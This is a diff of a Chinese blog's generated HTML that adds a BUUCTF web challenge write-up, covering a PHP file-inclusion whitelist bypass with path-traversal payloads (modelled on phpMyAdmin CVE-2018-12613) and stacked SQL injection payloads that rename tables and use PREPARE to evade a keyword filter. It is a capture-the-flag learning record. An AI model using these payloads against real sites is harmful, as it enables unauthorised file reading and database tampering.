@@ -110,17 +110,18 @@
 		}
 	})();
 </script>
-  <meta name="description" content="辣鸡CTF选手，渣Web，逆向只会F5的渣渣">
+  <meta name="description" content="[HCTF 2018]WarmUp打开后看网页源码，发现提示source.php，访问source.php看到php源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php    highlight_file(__FILE__);    class em">
 <meta name="keywords" content="Hexo, willv, 信息安全, hack, 技术, 博客">
 <meta property="og:type" content="website">
-<meta property="og:title" content="时光">
-<meta property="og:url" content="https://willv.cn/tags/CCS/index.html">
+<meta property="og:title" content="BUUCTF-WEB">
+<meta property="og:url" content="https://willv.cn/writeups/buuoj/web.html">
 <meta property="og:site_name" content="时光">
-<meta property="og:description" content="辣鸡CTF选手，渣Web，逆向只会F5的渣渣">
+<meta property="og:description" content="[HCTF 2018]WarmUp打开后看网页源码，发现提示source.php，访问source.php看到php源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php    highlight_file(__FILE__);    class em">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-10-13T08:42:33.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="时光">
-<meta name="twitter:description" content="辣鸡CTF选手，渣Web，逆向只会F5的渣渣">
+<meta name="twitter:title" content="BUUCTF-WEB">
+<meta name="twitter:description" content="[HCTF 2018]WarmUp打开后看网页源码，发现提示source.php，访问source.php看到php源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php    highlight_file(__FILE__);    class em">
 
 
 
@@ -130,7 +131,7 @@
 
   
   
-  <link rel="canonical" href="https://willv.cn/tags/CCS/">
+  <link rel="canonical" href="https://willv.cn/writeups/buuoj/web">
 
 
 
@@ -140,7 +141,7 @@
   };
 </script>
 
-  <title>标签: CCS | 时光</title>
+  <title>BUUCTF-WEB | 时光</title>
   
 
 
@@ -198,7 +199,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -270,7 +271,7 @@
         
         
           
-          <li class="menu-item menu-item-tags menu-item-active">
+          <li class="menu-item menu-item-tags">
 
     
     
@@ -321,7 +322,7 @@
         
         
           
-          <li class="menu-item menu-item-writeup">
+          <li class="menu-item menu-item-writeup menu-item-active">
 
     
     
@@ -461,57 +462,195 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>CCS<small>标签</small>
-        </h2>
-      </div>
+<h2 class="post-title" itemprop="name headline">BUUCTF-WEB
 
+</h2>
+
+<div class="post-meta">
+  
+  
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
       
         
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-          <a class="post-title-link" href="/2020/03/30/since18-4big-web/" itemprop="url">
+          
             
-              <span itemprop="name">2018年来系统安全四大顶会“泛”Web方向论文整理（更新至20年10月）</span>
-            
-          </a>
+          
+          
+            <li><a href="/writeups/">WRITEUPS</a></li>
+          
         
-      </h3>
+      
+    
+      
+      
+        
+          
+            
+          
+          
+            <li><a href="/writeups/buuoj/">BUUOJ</a></li>
+          
+        
+      
+    
+      
+      
+        
+          
+            
+          
+          
+            <li>WEB</li>
+          
+        
+      
+    
+  </ul>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-03-30T11:51:24+08:00" content="2020-03-30">
-          03-30
-        </time>
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>打开后看网页源码，发现提示<code>source.php</code>，访问<code>source.php</code>看到php源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们访问<code>hint.php</code>得到提示<code>flag not here, and flag in ffffllllaaaagggg</code>。</p>
+<p>分析php源码，发现主要是需要绕过前面的4个if语句。</p>
+<blockquote>
+<ol>
+<li><p>if (! isset($page) || !is_string($page))    page必须是一个字符串</p>
+</li>
+<li><p>if (in_array($page, $whitelist))    page要在whitelist中</p>
+</li>
+<li><p>$_page = mb_substr(…);if (in_array($_page, $whitelist))    取?前的内容是否在whitelist中</p>
+</li>
+<li><p>urldecode($page) （重复3）    url解码后再判断一次</p>
+</li>
+</ol>
+</blockquote>
+<p>这道题，用3和4都可以拿到flag，payload如下：</p>
+<blockquote>
+<ol start="3">
+<li>source.php?file=source.php?/../../../../../ffffllllaaaagggg</li>
+<li>source.php?file=source.php%253f/../../../../../ffffllllaaaagggg</li>
+</ol>
+</blockquote>
+<p>4就是对?再进行一次url编码。</p>
+<p>这里有一个坑，就是我在本地研究时发现，由于Windows的目录规则，不能有?，所以只能用4。此外，很多Writeup里在目录跨越这里都是写<code>php?../../flag</code>这种格式，应该写<code>php?/../../flag</code>这样才能把前面的php文件当成一个目录。虽然CTF平台都可以，但本地复现必须这么写。</p>
+<p>这个题的原型是phpmyadmin的一个漏洞：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12613" target="_blank" rel="noopener">CVE-2018-12613</a></p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><blockquote>
+<p>sqlmap是没有灵魂的</p>
+</blockquote>
+<p>手动注入，注入点在inject。</p>
+<p>尝试使用union select提示过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+<p>可以使用堆叠注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0&apos;; show databases;--+ 显示数据库</span><br><span class="line">0&apos;; show tables;--+ 显示表</span><br><span class="line">0&apos;; show columns from words;--+ 显示words表所有列</span><br><span class="line">0&apos;; show columns from `1919810931114514`;--+ 显示1919810931114514表所有列</span><br></pre></td></tr></table></figure>
+<p>在查询1919810931114514表时需要使用反引号`，看到表中有一列是flag。</p>
+<p>此时有好多获取flag的方法，多数人使用修改字段名的方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’; ALTER TABLE words CHANGE flag data VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure>
+<p>当然，也可以使用预处理语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;PREPARE hacker from concat(char(115,101,108,101,99,116), &apos; * from `1919810931114514` &apos;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;SET @sqli=concat(char(115,101,108,101,99,116),&apos;* from `1919810931114514`&apos;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;PREPARE hacker from concat(&apos;s&apos;,&apos;elect&apos;, &apos; * from `1919810931114514` &apos;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/qq_26406447/article/details/90643951" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90643951</a></p>
+<p><a href="https://www.cnblogs.com/wjw-zm/p/12359735.html" target="_blank" rel="noopener">https://www.cnblogs.com/wjw-zm/p/12359735.html</a></p>
+</blockquote>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>又是一个堆叠注入。</p>
+
+        
       </div>
-
-    </header>
-  </article>
-
-
+      
+      
       
     </div>
+    
 
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          
+            
+          
+          
+            <li><a href="/writeups/">WRITEUPS</a></li>
+          
+        
+      
+    
+      
+      
+        
+          
+            
+          
+          
+            <li><a href="/writeups/buuoj/">BUUOJ</a></li>
+          
+        
+      
+    
+      
+      
+        
+          
+            
+          
+          
+            <li>WEB</li>
+          
+        
+      
+    
+  </ul>
+
+
+    
+    
+    
   </div>
-  
-  
-  
-
-  
-
 
 
           </div>
           
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+      </div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -531,8 +670,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -687,6 +835,23 @@
       </div>
 
       
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">1.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">2.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">3.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
 
       
 
@@ -818,6 +983,10 @@
 
 
   
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
 
   
 
@@ -843,9 +1012,63 @@
   
   
 
+<script>
+  var disqus_config = function() {
+    this.page.url = "https://willv.cn/writeups/buuoj/web.html";
+    this.page.identifier = "writeups/buuoj/web.html";
+    this.page.title = 'BUUCTF-WEB';
+    };
+  function loadComments() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://wwillv.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', '' + +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  
+    $(function() {
+      var offsetTop = $('#comments').offset().top - $(window).height();
+      if (offsetTop <= 0) {
+        // load directly when there's no a scrollbar
+        loadComments();
+      } else {
+        $(window).on('scroll.disqus_scroll', function() {
+          // offsetTop may changes because of manually resizing browser window or lazy loading images.
+          var offsetTop = $('#comments').offset().top - $(window).height();
+          var scrollTop = $(window).scrollTop();
+
+          // pre-load comments a bit? (margin or anything else)
+          if (offsetTop - scrollTop < 60) {
+            $(window).off('.disqus_scroll');
+            loadComments();
+          }
+        });
+      }
+    });
+  
+</script>
 
 
 
+
+
+  
+    
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css">
+
+
+
+<script src="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js"></script>
+
+<script>
+  var dsqjs = new DisqusJS({
+    api: 'https://disqus.skk.moe/disqus/' || 'https://disqus.com/api/',
+    apikey: 'BOmm2MYh9jOZ82WCk1flJ5KDNWQWEyyQH0YKHEgJ1wqWW4zTuHFxlOOlmgreU34u',
+    shortname: 'wwillv'
+  });
+</script>
+
+  
 
 
   
